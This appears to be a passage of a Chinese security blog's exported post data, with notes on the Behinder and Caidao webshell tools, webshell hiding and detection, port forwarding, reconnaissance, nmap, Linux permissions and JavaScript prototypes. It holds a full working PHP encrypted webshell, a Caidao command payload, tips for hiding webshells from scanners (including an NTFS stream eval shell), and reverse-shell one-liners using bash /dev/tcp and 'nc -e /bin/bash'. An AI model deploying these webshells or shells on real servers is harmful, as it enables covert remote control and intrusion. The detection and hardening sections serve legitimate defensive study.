IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测。 而我们发送Payload被拦截的原因就在于，客户端发送的请求特征太明显，比如菜刀的payload 12caidao=Response.Write(&quot;-&gt;|&quot;);var err:Exception;try&#123;eval(System.Text.Encoding.GetEncoding(65001).GetString(System. Convert.FromBase64String(&quot;dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D&quot;)),&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(&quot;ERROR:// &quot;%2Berr.message);&#125;Response.Write(&quot;|&lt;-&quot;);Response.End();&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D虽然关键的代码采用了base64编码，但是payload中扔有多个明显的特征，比如有eval关键词，有Convert.FromBase64String，有三个参数，参数名为caidao（密码字段）、z1、z2，参数值有base64编码。根据这些特征很容易写出对应的防护规则，比如：POST请求中有Convert.FromBase64String关键字，有z1和z2参数，z1参数值为4个字符，z2参数值为base64编码字符。 冰蝎就考虑通过动态二进制编码的思路来绕过防火墙，具体流程如下： 首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器侧的Session中。 客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。 服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。 服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。 客户端解密服务器端返回的结果。 下载安装直接在github上下载，传送门 下载后直接解压，得到一个jar包，本地有java环境就可以直接运行 实战在自己的php环境中写一个一句话木马，其代码如图所示 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#x27;pass&#x27;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&#x27;k&#x27;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&#x27;k&#x27;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt; 用冰蝎连接 双击增加的链接显示出phpinfo()即成功！ 虚拟终端(在windows平台上可以是exec或者powershell) 反弹shell，这个很有用 数据库可视化功能","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"渗透之域渗透","slug":"渗透之域渗透","date":"2021-03-12T08:01:51.000Z","updated":"2021-07-31T15:17:04.336Z","comments":true,"path":"2021/03/12/渗透之域渗透/","link":"","permalink":"http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/","excerpt":"","text":"1.什么是域将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。 (域是一种逻辑结构，是指一个有安全边界的集合，同一个域中的计算机彼此之间建立信任关系，计算机之间允许互相访问) 域控制器（Domain controller，简称DC）是指在计算机网络域内响应安全身份认证请求的网络服务器负责允许发出请求的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息，并执行域的安全策略。 域渗透思路","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"渗透之webshell","slug":"渗透之webshell","date":"2021-03-12T08:01:51.000Z","updated":"2021-07-12T12:19:41.647Z","comments":true,"path":"2021/03/12/渗透之webshell/","link":"","permalink":"http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8Bwebshell/","excerpt":"","text":"webshellwebshell是以asp、jsp、php或cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门 cgi（common gateway interface）：公共网关接口 常用的攻击方式有：直接上传文件、SQL注入、远程文件包含（RFI）、甚至使用XSS作为攻击的一部分。 如何隐藏webshell 将指令隐藏在UA，而不是放在$_POST传递命令 1&lt;?php system($_SERVER(&#x27;HTTP_USER_AGENT&#x27;))&gt; 这种方式会在服务器日志中留下痕迹，很容易被识别 动态函数执行，把一个函数名当成一个字符串传递给一个变量，然后去执行(类似的：把执行命令分别放在一个文件中，然后用另一个文件去包括) 1&lt;?php $a=&quot;phpinfo&quot;; $a()&gt; 使用各种编码比如hex、base64等，而且目录层数越深越好，尽量把上传的webshell放到四五级目录下 webshell里面尽量不要用类似eval，exec,system,assert这样敏感的特征，因为awk很容易检测出来。可以自己写一些自定义函数，或者使用 call_user_func这样的回调函数来构造webshell。 在win sever环境下，使用windows中的隐藏文件 — NTFS文件流（ADS） 1echo ~&lt;?php @eval($_POST[&#x27;chaper&#x27;]);?~&gt; &gt; index.php:hidden.jpg 这样就生成了一个不可见的文件，常规的文件管理器，type命令，dir命令都不能发现这个index.php:hidden.jpg,这个文件只能通过命令notepad index.php:hidden.jpg打开。 webshell检测1.基于webshell的特征检测常见的webshelll函数 存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等； 存在系统调用的文件操作函数，如fopen、fwrite、readdir等 存在数据库操作函数，调用系统自身的存储过程来连接数据库操作； 这种基于特征值、危险函数的特征检测只能查找已知的webshell，无法查找0day型的webshell，而且误报率比较高。对于大型的网站，可以使用强弱特征，即把特征分为强弱两种特征，强特征命中则是webshell，弱特征由人工去判断 2.基于流量特征的webshell检测webshell通信是HTTP协议。只要我们把webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好。webshell如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。如果黑客反向连接的话，Agent和IDS都可以检测到。Webshell总有一个HTTP请求，如果在网络层监控HTTP，并且检测到有人访问了一个从没反问过的文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。 比如中国菜刀的流量特征就很明显 3. 日志检测使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，这是：HTTP异常请求模型检测。例如：一个平时是GET的请求突然有了POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。 ebshell的访问特征(主要特征) 少量ip对其发起访问 总的访问次数少 优点：采用了一定数据分析的方式，网站的访问量达到一定量级时这种检测方法的结果具有较大参考价值。 缺点：存在一定误报，对于大量的访问日志，检测工具的处理能力和效率会比较低。 webshell防御 建议用户通过ftp来上传、维护网页，尽量不安装asp，php的上传程序。 对asp，php上传程序的调用一定要进行身份认证，并只允许信任的人使用上传程序。 利用白名单上传文件，上传目录权限遵循最小权限原则。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"渗透之端口转发","slug":"渗透之端口转发","date":"2021-03-12T08:01:51.000Z","updated":"2021-07-12T02:53:21.895Z","comments":true,"path":"2021/03/12/渗透之端口转发/","link":"","permalink":"http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"端口转发在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题： 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口 常用的方法有 nc、lcx、socks、bash反弹、MSF后门反弹、frp nc端口转发背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 在192.168.50.2上开启8000端口nc -l 8000 在192.168.50.2上实现9000端口转发cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo 在192.168.50.1上连接192.168.50.2的9000端口nc -vn 192.168.50.2 9000 Shell命令实现端口转发 部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1 1234ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost # 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost# 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口. 案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可 ssh -CfNg -L 6300:127.0.0.1:80 userc@C ssh -CfNg -R 80:127.0.0.1:6300 usera@A 服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例: tcpdump -s 0 -i lo port 6300","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"web安全之信息收集","slug":"wen安全之信息收集","date":"2021-03-11T08:01:51.000Z","updated":"2021-07-03T10:50:27.208Z","comments":true,"path":"2021/03/11/wen安全之信息收集/","link":"","permalink":"http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"1.信息收集在web渗透中，信息收集的深度与广度决定了后续渗透测试的成功与否，所以我们需要尽可能的收集目标的所有信息；收集方向大概分为以下几点： 有无CDN 有无WAF 组织信息 搭建环境 站点架构 网站源码获取 域名信息 有无APK 有无微信小程序 有无PC应用 自动批量信息收集 其它信息收集 2. 信息收集思路 拿到渗透测试目标后，首先判断目标域名是否存在CDN，如果存在，需要先绕过CDN获取真实IP后再进行下一步，防止后续渗透测试全部测试到CDN节点上。 如何绕过CDN? 测试目标是否存在WAF，可以通过工具识别（存在误判）或者通过人工识别（根据拦截页面的图片判断）的方式判断是否存在WAF，什么类型的WAF，然后针对性的进行绕过. 12345# Nmap有一些脚本可以来测试WAF中是否存在于所有检测到的HTTP端口nmap -sT -sV-p 80,443,8080,8081 --script=http-waf-detect 192.168.56.11nmap -p80,443 --script=http-waf-fingerprint www.example.com# SQLMap中自带的WAF识别模块可以识别出WAF的种类，但是如果所安装的WAF并没有什么特征，SQLMap就只能识别出类型是Generic。sqlmap.py -u “url” –identify-waf –batch 先从组织信息这块入手，获取到网站和管理员的一些信息（QQ,手机号，邮箱等等…），通过whois，网站备案信息获取更多目标；后期需要爆破时可以通过获取到的联系方式针对性的生成字典，提高爆破成功率；也可以利用联系方式在Github等托管平台搜索泄露的敏感信息 针对网站搭建环境需要收集目标操作系统是Windows还是Linux?具体内核版本是什么?开放了哪些端口和服务？后续可以针对性的进行测试(例如可以使用公开的缓冲区溢出，RCE，弱口令等安全漏洞进行测试)；收集到目标的中间件版本信息，数据库版本信息后，一样可以寻找相关安全漏洞进行测试(例如中间件解析漏洞,RCE,远程代码执行等等，数据库弱口令,未授权访问等等)。获取的Web接口（短信接口，支付接口等等）也可以作为渗透测试的一个突破口。了解网站使用的脚本语言也很重要，由于各种脚本语言的特性与机制，其产生的安全问题也有很大差异（例如PHP站点中经常出现SQL注入，文本包含等安全问题，而Java站点中则经常出现反序列化的安全漏洞） 网站的搭建架构也是不可忽视的部分，很多站点在同一台服务器上经常使用端口，目录，子域名等方式区分站点，所以我们渗透测试时需要对开放端口，网站目录，子域名等信息都要收集（在进行目录扫描时除了对网站域名进行扫描，也建议对网站IP进行扫描；例如某个网站 http://192.168.1.1 站点的根目录是www，其下域名test.com 的根目录是www/test.com 。如果在网站根目录www下存在test.com的源码备份，我们扫描时如果只针对域名进行目录扫描，是无法获取到源码备份的，只有通过对IP站点进行目录扫描才能发现test.com的源码备份）。 在渗透测试时，能获取到网站源码往往能达到事半功倍的效果。如果我们知道目标站点使用的是CMS搭建，那么我们就可以寻找该CMS公开漏洞进行测试；如果使用的是框架开发，那么也可以搜索该框架漏洞进行测试；或者我们可以利用获取的网站源码进行本地搭建测试寻找安全漏洞，也可以通过代码审计的方式挖掘0day。 如何获取网站源码：可以通过扫描网站目录获取源码备份；CMS可以直接去CMS官网下载；框架开发的站点可以去官网下载框架本地安装；某些正规源码（商城，博客，企业等等）可以通过搜索引擎在一些正规源码站获取，违法源码（BC，棋牌，私服，杀猪盘等等）也可以通过搜索引擎在一些黑源码站进行获取；某些站点可能使用了Github，Gitee等托管平台托管，也可能存在源码泄露的安全问题。 针对域名的收集可以通过网站备案，Whois查询获取更多目标（Whois反查注册人，电话，邮箱等等）；通过IP地址反查绑定的域名信息；也可以通过搜索引擎或者在线平台获取目标子域名或利用工具进行子域名枚举；也可以利用空间引擎寻找同模板站点，在同模板站点获取源码后进行代码审计挖掘到漏洞后在转向测试目标；或者通过搜索域名中的关键字（例如 baidu.com 中的baidu，在搜索引擎或域名注册商处查询类似域名 baidu.cn，baidu.net等等)。或者对旁站C段进行信息收集，从旁站或C段入手，间接的拿下目标站点。 假如目标只是一个单纯的APK下载页或PC程序下载页，或者是一个微信公众号，那么我们可以通过对这些APK&amp;微信小程序&amp;PC应用进行抓包或者逆向获取其中的URL和IP地址，转向Web渗透测试的思路。 在收集测试目标的Web目录，备份文件等信息时，除了使用Web目录文件扫描，还可以进行Fuzz，尽可能的收集更多信息；而后期在SQL注入，文件上传，XSS等漏洞挖掘或绕Waf时也可以使用Fuzz进行测试。","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://yejuns.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"web安全之Nmap使用","slug":"NMap使用","date":"2021-03-03T13:21:21.000Z","updated":"2021-07-19T02:26:01.008Z","comments":true,"path":"2021/03/03/NMap使用/","link":"","permalink":"http://yejuns.github.io/2021/03/03/NMap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"NmapNmap是被专业人员广泛使用的一款功能全面的端口扫描工具 安装kali上已经自带，windows上去官网下载相关的安装包，centos就直接 yum install nmap 简单入门刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 nmap your-ip（域名） 就可以扫描出其对外开放的服务。 123456789101112nmap 192.168.31.13#基本格式，会扫描该主机的所有端口nmap -p 8080 192.168.31.13# 判断指定ip是否开放指定端口 nmap -p 22,21,80 192.168.31.13nmap -p 22,21,80 192.168.31.1-253# 增加端口和网段 nmap 192.168.31.1/24# 扫描整个子网的端口，这个过程可能会比较久 进阶Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种 Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务） Closed，关闭状态（TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口） Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能确定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致 Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。 Open|filtered Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型 Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态， 以下是一些例子 123456789101112131415161718192021nmap -O 192.168.31.13 -p 8080#操作系统检测（-O）nmap -Pn 80 192.168.31.13# 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作nmap -A 192.168.31.13 -p 8080# 强力检测选项（-A），Nmap将检测目标主机的下述信息# 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）nmap -sT 192.168.31.1# TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来nmap -sS 192.168.31.1# SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式namp -sN 192.168.31.1namp -sF 192.168.31.1#TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。-O x.x.x.x #检测目标主机系统 UDP扫描nmap -sU 192.168.1.1 Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必定会超过18个小时。 优化方法主要是: 进行并发的UDP扫描； 优先扫描常用端口； 在防火墙后面扫描； 启用–host-timeout选项以跳过响应过慢的主机。 假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP） 使用命令 nmap -sU 192.168.56.103 -p 53,161 目标端口选项默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。 1234567-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p 1-1024。扫描1 〜65535端口时，可使用-p-选项。-F（快速扫描）：将仅扫描100 个常用端口。-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。-top-ports &lt;1 or=&quot;&quot; greater=&quot;&quot;&gt;：扫描nmap-services 里排名前N的端口。 Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE） 12nmap -p1-65000 -sV 192.168.1.1#扫描目标ip的1-65000端口，并进行服务版本识别 NC由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能 123456nc -l -p 80 #监听本机的TCP80端口nc -nvv 192.168.x.x 80 #连到192.168.x.x的TCP80端口nc -e /bin/bash 192.168.0.1 33# 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Linux 中的安全模型","slug":"Linux 中的安全模型","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T05:48:45.271Z","comments":true,"path":"2020/12/31/Linux 中的安全模型/","link":"","permalink":"http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"Linux 的构成Linux 可以分为内核层和用户层。用户层通过内核层提供的操作接口，来执行各类任务 内核层提供的权限划分、进程隔离和内存保护的安全功能，是用户层的安全基础。一旦内核 安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存。 但作为使用者，对于内核层我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新。我们需要关注的是用户层的安全。 用户层安全在 Linux 中，用户层的所有操作，都可以抽象为“主体 -&gt; 请求 -&gt; 客体”这么一个流程。 比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。 在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。Linux 用户层则需要确保权限的正确配置 Linux中的认证机制Linux是一个多用户操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有 2个比较关键的文件：/etc/passwd和/etc/shadow /etc/passwd是全局可读的，不具备保密性。因此，/etc/passwd不会直接存储密码，而是用x来进行占位。那实际的用户密码信息，就会存储到仅ROOT可读的/etc/shadow中。 在/etc/shadow中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过Chage 命令来对密码管理策略进行修改,如 12chage -M 60 ye# 强制用户ye在 60 天内必须对密码进行修改 因为认证这个功能是由Linux内核来提供的，所以在用户层，我们需要关心的,就是弱密码导致的身份信息泄漏。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过使用已知的弱密码库，来对 Linux 中的弱密码进行检测 Linux 中的授权机制Linux对目录和文件除了r,w,x3种权限外，还提供了一些额外的权限标签，来进行更细粒度地权限控制 Linux 提供了文件属性的概念，来对文件设置更多的保护。通过chattr +i /etc/passwd可以防止文件被任何用户修改 Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如chmod +t /tmp可以阻止删除/tmp目录下其他用户的文件 要解决权限问题，我们就要实践最小权限原则。 Linux中最普遍的问题，就是滥用Root，很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境 但是，在 ROOT 的 Shell 环境中，启动的所有进程也都具备ROOT权限。如果启动的是一个立即返回的进程，如CAT,不会有太多问题，但如果是一个长期 运行的进程，就很容易产生权限的滥用。 比如，当你以ROOT的身份启动Redis或者 MySQL 时，如果这时有其他用户 连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。 谨记“最小权限”原则。也就是说，我们根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。 我们不需要自己去配置这些权限，而是常常使用一些已知的工具，来实现“最小权限”启动长驻进程的功能。 比如说，我们可以通过 mysqld 启动 MySQL 服务时，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT下建立守护进程(可以理解为服务)。 类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。","categories":[],"tags":[{"name":"Linux安全","slug":"Linux安全","permalink":"http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"}]},{"title":"burpsuite使用","slug":"burpsuite使用","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T00:21:11.994Z","comments":true,"path":"2020/12/31/burpsuite使用/","link":"","permalink":"http://yejuns.github.io/2020/12/31/burpsuite%E4%BD%BF%E7%94%A8/","excerpt":"","text":"","categories":[],"tags":[{"name":"测试","slug":"测试","permalink":"http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"}]},{"title":"js原型链","slug":"js原型链","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-01T03:21:56.544Z","comments":true,"path":"2020/12/31/js原型链/","link":"","permalink":"http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/","excerpt":"","text":"重点原型链最重要的是记住这三点 __proto__、 constructor 属性是对象所独有的； prototype 属性是函数独有的； 上面说过js中函数也是对象的一种，那么函数同样也有属性__proto__、 constructor； 也就是说，普通对象（比如 {a:1}）没有prototype属性—不明白 前置知识 想要弄清楚原型和原型链，这几个属性必须要搞清楚，__proto__ 、prototype 、 constructor。 其次你要知道js中对象和函数的关系，函数其实是对象的一种。 最后你要知道函数、构造函数的区别，任何函数都可以作为构造函数，但是并不能将任意函数叫做构造函数，只有当一个函数通过new关键字调用的时候才可以成为构造函数。如：1234567var Parent = function()&#123;&#125;//定义一个函数，那它只是一个普通的函数，下面我们让这个函数变得不普通var p1 = new Parent();//这时这个Parent就不是普通的函数了，它现在是一个构造函数。因为通过new关键字调用了它//创建了一个Parent构造函数的实例 p1 prototype属性它是函数独有的属性，从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。prototype设计之初就是为了实现继承，让由特定函数创建的所有实例共享属性和方法，也可以说是让某一个构造函数实例化的所有对象可以找到公共的方法和属性。有了prototype我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。继续引用上面的代码，当我们想为通过Parent实例化的所有实例添加一个共享的属性时， 1Parent.prototype.name &#x3D; &quot;我是原型属性，所有实例都可以读取到我&quot;; 这就是原型属性，当然也可以添加原型方法。那问题来了，p1怎么知道他的原型对象上有这个方法呢，往下看↓↓↓ proto属性1__proto__属性相当于指向prototype唯一的指针 __proto__ 属性告诉我们一个对象的原型是什么. 我们说了，Parent.prototype上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过__proto__属性。每个对象都有__proto__属性，该属性指向的就是该对象的原型。 1p1.__proto__ === Parent.prototype; // true p1.prototype 是错误的(可以理解为，在new出一个实例对象后，需要让new出的对象可以指向原型，因此设置了_proto_属性) __proto__通常称为隐式原型，prototype通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。我们之前也说过__proto__属性是对象（包括函数）独有的，那么Parent.prototype也是对象，那它有隐式原型么？又指向谁？ 1Parent.prototype.__proto__ === Object.prototype; //true 可以看到，构造函数的原型对象上的隐式原型对象指向了Object的原型对象。那么Parent的原型对象就继承了Object的原型对象。由此我们可以验证一个结论，万物继承自Object.prototype。这也就是为什么我们可以实例化一个对象，并且可以调用该对象上没有的属性和方法了。如： 12//我们并没有在Parent中定义任何方法属性，但是我们可以调用p1.toString();//hasOwnProperty 等等的一些方法 我们可以调用很多我们没有定义的方法，这些方法是哪来的呢？现在引出原型链的概念，当我们调用p1.toString()的时候，先在p1对象本身寻找，没有找到则通过p1.__proto__找到了原型对象Parent.prototype，也没有找到，又通过Parent.prototype.__proto__找到了上一层原型对象Object.prototype。在这一层找到了toString方法。返回该方法供p1使用。 当然如果找到Object.prototype上也没找到，就在Object.prototype.__proto__中寻找，但是Object.prototype.__proto__ === null所以就返回undefined。这就是为什么当访问对象中一个不存在的属性时，返回undefined了。 constructor属性12345function Person(age)&#123; this.age = age;&#125;var per1 = new Person(12);var per2 = new Person(13); 上面的例子中per1、per2都是Person的实例，这两个实例都有一个constructor属性，该属性（是一个指针）指向Person。（要把Person（）看成是构造函数） 1console.log(per1.constructor &#x3D;&#x3D; per2.constructor &#x3D;&#x3D; Person); &#x2F;&#x2F;true 函数的prototype对象都包含一个constructor的属性，constructor指向当前构造函数","categories":[],"tags":[{"name":"javaScript","slug":"javaScript","permalink":"http://yejuns.github.io/tags/javaScript/"}]},{"title":"bwapp学习笔记-A1 